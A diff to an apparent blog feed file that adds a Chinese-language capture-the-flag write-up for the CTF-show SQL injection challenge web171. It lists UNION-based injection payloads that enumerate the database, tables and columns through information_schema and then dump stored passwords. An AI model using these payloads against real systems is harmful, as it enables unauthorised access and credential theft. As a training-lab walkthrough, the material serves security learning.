@@ -8,7 +8,7 @@
       <link href="/2022/03/01/CTF-show-SQL%E6%B3%A8%E5%85%A5-1/"/>
       <url>/2022/03/01/CTF-show-SQL%E6%B3%A8%E5%85%A5-1/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<h3 id="1、web171"><a href="#1、web171" class="headerlink" title="1、web171"></a>1、web171</h3><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010825363.png"  /><p>在网页中给出的用户表中可以看到ID=3后，数据无法显示，这说明有三个字段数</p><p>判断字段后，首先查询数据库名字： <code>ctfshow_web</code></p><p><code>1&#39; union select 1,2,database()--+</code></p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010831630.png" alt="数据库的信息收集"></p><p>得到数据库后查询<code>ctfshow_web</code>中的表名： <code>ctfshow_user</code></p><p><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;--+</code></p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010841926.png" alt="表名"></p><p>得到表名后查询 <code>ctfshow_user</code>里的所有列名：<code>id,username,password</code></p><p><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_user&#39;--+</code></p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010847832.png" alt="列名"></p><p>查询列名password中的数据即可：</p><p><code>1&#39; union select 1,2,group_concat(password) from ctfshow_user--+</code></p><p><img src="https://gitee.com/mie1732/emc/raw/master/img/202203010851191.png" alt="password"></p>]]></content>
       
       
       <categories>
